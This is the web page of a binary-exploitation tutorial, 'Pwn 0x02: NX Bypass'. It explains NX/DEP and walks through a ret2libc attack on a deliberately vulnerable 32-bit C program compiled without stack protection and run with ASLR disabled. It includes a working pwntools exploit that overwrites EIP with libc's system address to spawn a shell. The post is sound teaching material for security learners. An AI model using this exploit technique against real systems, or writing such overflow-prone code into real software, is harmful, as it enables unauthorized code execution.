<!DOCTYPE html>
<html lang="en" dir="auto">

<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-48LCDX0T0B"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-48LCDX0T0B');
</script>

<meta name="google-site-verification" content="tMHAv1yKyGLEQa4u4DMm_H9UwwX9FXyeMRCiIvg4vRc"/>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Pwn 0x02: NX Bypass | New Horizonz</title>
<meta name="keywords" content="pwn, binary, memory, x32, x64, gdb, memory corruption, binary exploitation, exploit development, ret2libc, return2libc, ret2system">
<meta name="description" content="Stack is not allowing code execution? Let&rsquo;s bypass it">
<meta name="author" content="Signore">
<link rel="canonical" href="https://the-root-user.github.io/blog/posts/pwn-0x02-nx-bypass/">
<link crossorigin="anonymous" href="/blog/assets/css/stylesheet.5200049e975744b2fc0844b736800ec3bdb1e3648c2a8effca49099eb7b78fc2.css" integrity="sha256-UgAEnpdXRLL8CES3NoAOw72x42SMKo7/ykkJnre3j8I=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/blog/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://the-root-user.github.io/blog/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://the-root-user.github.io/blog/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://the-root-user.github.io/blog/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://the-root-user.github.io/blog/apple-touch-icon.png">
<link rel="mask-icon" href="https://the-root-user.github.io/blog/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Pwn 0x02: NX Bypass" />
<meta property="og:description" content="Stack is not allowing code execution? Let&rsquo;s bypass it" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://the-root-user.github.io/blog/posts/pwn-0x02-nx-bypass/" />
<meta property="og:image" content="https://the-root-user.github.io/blog/images/cover-binexp-02.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-08-22T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-08-22T00:00:00&#43;00:00" /><meta property="og:site_name" content="&lt;img src=&#34;https://the-root-user.github.io/blog/Logo_NewHorizonz.gif&#34; height=&#34;28&#34;&gt; &lt;/a&gt;" />
<meta property="og:see_also" content="https://the-root-user.github.io/blog/posts/pwn-0x01-buffer-overflow/" /><meta property="og:see_also" content="https://the-root-user.github.io/blog/posts/pwn-0x00-warmup/" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://the-root-user.github.io/blog/images/cover-binexp-02.png" />
<meta name="twitter:title" content="Pwn 0x02: NX Bypass"/>
<meta name="twitter:description" content="Stack is not allowing code execution? Let&rsquo;s bypass it"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://the-root-user.github.io/blog/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Pwn 0x02: NX Bypass",
      "item": "https://the-root-user.github.io/blog/posts/pwn-0x02-nx-bypass/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Pwn 0x02: NX Bypass",
  "name": "Pwn 0x02: NX Bypass",
  "description": "Stack is not allowing code execution? Let\u0026rsquo;s bypass it",
  "keywords": [
    "pwn", "binary", "memory", "x32", "x64", "gdb", "memory corruption", "binary exploitation", "exploit development", "ret2libc", "return2libc", "ret2system"
  ],
  "articleBody": "In this post we are going to learn an exploit mitigation technique: what it is and how to bypass it.\nNew to the series? check out my previous posts here.\nNo Execute Last time, we put shellcode on the stack and called it to get code execution. In modern binaries, usually what happens is that the stack is not executable, means we can put something on the stack but it will only be considered a piece of data by the program and not some cpu instruction. This technique is called NX (No eXecute) or DEP (Data Execution Prevention).\nAlthough the data on the stack is not executable, making a function call and passing required/desired arguments is still allowed. Weâ€™re going to make use of this fact.\nWhen we are writing code for a program, we donâ€™t write code for print and such functions. They are said to be built-ins. When we compile the program, the compiler links the program to a library (shared object) in which it would be able to find definitions of those functions during execution. Such programs are termed as Dynamically Linked which we mostly deal with, while on the contrary are Statically Linked programs which we wonâ€™t discuss right now.\nMost of the C programs - whether itâ€™s x86 or x64 - rely on libc, the default C library.\nWe can see the shared objects (libraries) being used by a program, with the ldd command     Terminal    \nSince during the program execution, the program is making use of library functions, so the library (libc) is mapped in memory. We can abuse this by finding memory addresses and making calls to other functions present in the library as per our need. print, write, system, exit, etc are some of the functions present in the libc out of which, for now, we are most interested in system. This technique is called return2libc, ret2libc or ret2system.\nSetup Using the code from previous exercise:     vulnerable.c  #include #include  int overflow(){ char buffer[500]; int userinput; userinput = read(0, buffer, 700); printf(\"\\nUser provided %d bytes. Buffer content is: %s\\n\", userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; }    Compile with the command:     Terminal  gcc -m32 -fno-stack-protector vulnerable.c -o vulnerable    Notice that we are not using the -z execstack flag anymore, which makes the stack executable.\nOur program has following protections:     Terminal    Before proceeding any further, remember to disable ASLR.\nExploitation We find the offset of EIP to be 516. You know how, right?\nWe want to execute system(\"/bin/sh\") for which we are going to overwrite the EIP with the address of the system function, and then weâ€™ll give the return address which can be anything (e.g JUNK) but we will keep it to be the address of the exit function so that our program terminates nicely. Lastly, we will give the function arguments which, in present case, would be the address of the /bin/sh string. Remember stack alignment? revise here\nWith the vmmap command in gdb, we can confirm that the libc/certain sections of libc are loaded into the program     Terminal    \nLetâ€™s get our required memory addresses with gdb:     Terminal    Now that we have all we needed, letâ€™s construct our exploit:     exploit.py  from pwn import * exe = \"./vulnerable\" elf = context.binary = ELF(exe,checksec=False) system_addr = 0xf7dff040 exit_addr = 0xf7df1990 binsh_addr = 0xf7f46338 padding = \"A\"*516 payload = flat(padding, system_addr, exit_addr, binsh_addr) #write(\"payload\",payload) io = process(exe) io.sendline(payload) io.interactive()    Letâ€™s run the exploit:     Terminal    And.. Yea! we got our shell ðŸ”¥\n",
  "wordCount" : "582",
  "inLanguage": "en",
  "image":"https://the-root-user.github.io/blog/images/cover-binexp-02.png","datePublished": "2022-08-22T00:00:00Z",
  "dateModified": "2022-08-22T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Signore"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://the-root-user.github.io/blog/posts/pwn-0x02-nx-bypass/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "New Horizonz",
    "logo": {
      "@type": "ImageObject",
      "url": "https://the-root-user.github.io/blog/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://the-root-user.github.io/blog" accesskey="h" title="  (Alt + H)">
                <img src="https://the-root-user.github.io/blog/Logo_NewHorizonz.gif" alt="logo" aria-label="logo"
                    height="28"> </a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://the-root-user.github.io/blog/author/">
                    <span>About Me</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/archives/">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/series/">
                    <span>Series</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/categories/">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/tags/">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/search/" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://the-root-user.github.io/blog">Home</a>&nbsp;Â»&nbsp;<a href="https://the-root-user.github.io/blog/posts/">Posts</a></div>
    <h1 class="post-title">
      Pwn 0x02: NX Bypass
    </h1>
    <div class="post-meta">


<span title='2022-08-22 00:00:00 +0000 UTC'>August 22, 2022</span>&nbsp;Â·&nbsp;3 min

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#no-execute">No Execute</a>
      <ul>
        <li><a href="#setup">Setup</a></li>
      </ul>
    </li>
    <li><a href="#exploitation">Exploitation</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>In this post we are going to learn an exploit mitigation technique: what it is and how to bypass it.</p>
<p>New to the series? check out my previous posts <a href="/blog/series/binary-exploitation-adventures">here</a>.</p>
<h2 id="no-execute">No Execute<a hidden class="anchor" aria-hidden="true" href="#no-execute">#</a></h2>
<p>Last time, we put shellcode on the stack and called it to get code execution. <br>
In modern binaries, usually what happens is that the stack is not executable, means we can put something on the stack but it will only be considered a piece of data by the program and not some cpu instruction. This technique is called <strong>NX</strong> (No eXecute) or <strong>DEP</strong> (Data Execution Prevention).</p>
<p>Although the data on the stack is not executable, making a function call and passing required/desired arguments is still allowed. We&rsquo;re going to make use of this fact.</p>
<p>When we are writing code for a program, we don&rsquo;t write code for <code>print</code> and such functions. They are said to be built-ins. When we compile the program, the compiler links the program to a library (shared object) in which it would be able to find definitions of those functions during execution. <br>
Such programs are termed as Dynamically Linked which we mostly deal with, while on the contrary are Statically Linked programs which we won&rsquo;t discuss right now.</p>
<p>Most of the C programs - whether it&rsquo;s x86 or x64 - rely on <strong>libc</strong>, the default C library.</p>
<details><summary>We can see the shared objects (libraries) being used by a program, with the <code>ldd</code> command</summary>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="img00.png" alt="">
    </div>
</div>

</details><br>
<p>Since during the program execution, the program is making use of library functions, so the library (libc) is mapped in memory. We can abuse this by finding memory addresses and making calls to other functions present in the library as per our need. <br>
<code>print</code>, <code>write</code>, <code>system</code>, <code>exit</code>, etc are some of the functions present in the libc out of which, for now, we are most interested in <code>system</code>. <br>
This technique is called <strong>return2libc</strong>, ret2libc or ret2system.</p>
<h3 id="setup">Setup<a hidden class="anchor" aria-hidden="true" href="#setup">#</a></h3>
<p>Using the code from previous exercise:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">vulnerable.c</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">overflow</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">500</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">userinput</span><span class="p">;</span>
    <span class="n">userinput</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">700</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">User provided %d bytes. Buffer content is: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">userinput</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> 
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="n">overflow</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
    </div>
</div>
</p>
<p>Compile with the command:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gcc -m32 -fno-stack-protector vulnerable.c -o vulnerable
</code></pre></div>
    </div>
</div>
</p>
<p>Notice that we are not using the <code>-z execstack</code> flag anymore, which makes the stack executable.</p>
<p>Our program has following protections:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="img01.png" alt="">
    </div>
</div>
</p>
<p>Before proceeding any further, remember to disable ASLR.</p>
<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
<p>We find the offset of EIP to be 516. You know how, right?</p>
<p>We want to execute <code>system(&quot;/bin/sh&quot;)</code> for which we are going to overwrite the EIP with the address of the <code>system</code> function, and then we&rsquo;ll give the return address which can be anything (e.g JUNK) but we will keep it to be the address of the <code>exit</code> function so that our program terminates nicely. Lastly, we will give the function arguments which, in present case, would be the address of the <code>/bin/sh</code> string. <br>
Remember stack alignment? revise <a href="/blog/posts/pwn-0x01-buffer-overflow/#the-stack">here</a></p>
<details><summary>With the <code>vmmap</code> command in gdb, we can confirm that the libc/certain sections of libc are loaded into the program</summary>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="img02.png" alt="">
    </div>
</div>

</details><br>
<p>Let&rsquo;s get our required memory addresses with gdb:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="img03.png" alt="">
    </div>
</div>
</p>
<p>Now that we have all we needed, let&rsquo;s construct our exploit:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">exploit.py</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="s2">&#34;./vulnerable&#34;</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0xf7dff040</span>
<span class="n">exit_addr</span> <span class="o">=</span> <span class="mh">0xf7df1990</span>
<span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0xf7f46338</span>

<span class="n">padding</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">516</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">,</span> <span class="n">exit_addr</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">)</span>

<span class="c1">#write(&#34;payload&#34;,payload)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
    </div>
</div>
</p>
<p>Let&rsquo;s run the exploit:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="img04.png" alt="">
    </div>
</div>

And.. Yea! we got our shell ðŸ”¥</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://the-root-user.github.io/blog/tags/pwn/">pwn</a></li>
      <li><a href="https://the-root-user.github.io/blog/tags/buffer-overflow/">buffer overflow</a></li>
      <li><a href="https://the-root-user.github.io/blog/tags/ret2libc/">ret2libc</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="https://the-root-user.github.io/blog/posts/ncc-ctf-2022/">
    <span class="title">Next Â»</span>
    <br>
    <span>NCC CTF 2022 - Rev &amp; BinExp Challenges Writeup</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x02: NX Bypass on twitter"
        href="https://twitter.com/intent/tweet/?text=Pwn%200x02%3a%20NX%20Bypass&amp;url=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x02-nx-bypass%2f&amp;hashtags=pwn%2cbufferoverflow%2cret2libc">
        <ion-icon name="logo-twitter" size="large"></ion-icon>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x02: NX Bypass on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x02-nx-bypass%2f&amp;title=Pwn%200x02%3a%20NX%20Bypass&amp;summary=Pwn%200x02%3a%20NX%20Bypass&amp;source=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x02-nx-bypass%2f">
        <ion-icon name="logo-linkedin" size="large"></ion-icon>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x02: NX Bypass on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x02-nx-bypass%2f">
        <ion-icon name="logo-facebook" size="large"></ion-icon>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x02: NX Bypass on whatsapp"
        href="https://api.whatsapp.com/send?text=Pwn%200x02%3a%20NX%20Bypass%20-%20https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x02-nx-bypass%2f">
        <ion-icon name="logo-whatsapp" size="large"></ion-icon>
    </a>
</div>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://the-root-user.github.io/blog">New Horizonz</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" class="top-link" id="top-link">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>
<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
const images = Array.from(document.querySelectorAll(".post-content img"));
images.forEach(img => {
  mediumZoom(img, {
    margin: 10,  
    background: '#121417e4',  
    scrollOffset: 20,  
    container: null,  
    template: null  
  });
});
</script>




<script>
    const toc = document.querySelector('.toc')

    window.addEventListener('scroll', function() {
        if (window.scrollY > 70) {
             toc.style.top = '2.5rem'
        } else {
            toc.style.top = '10.9rem'
        }
    })
</script>

<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
<script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>


<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>


<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>




<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        
        copybutton.innerHTML = '<span style="margin: 5px"><ion-icon name=\"clipboard-outline\"></ion-icon><span style=\"font-size: 16px\"> copy</span></span>';

        function copyingDone() {
            copybutton.innerHTML = '<span style="margin: 5px"><ion-icon name=\"checkmark-outline\"></ion-icon><span style=\"font-size: 16px\"> copied!</span></span>';
            setTimeout(() => {
                copybutton.innerHTML = '<span style="margin: 5px"><ion-icon name=\"clipboard-outline\"></ion-icon><span style=\"font-size: 16px\"> copy</span></span>';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
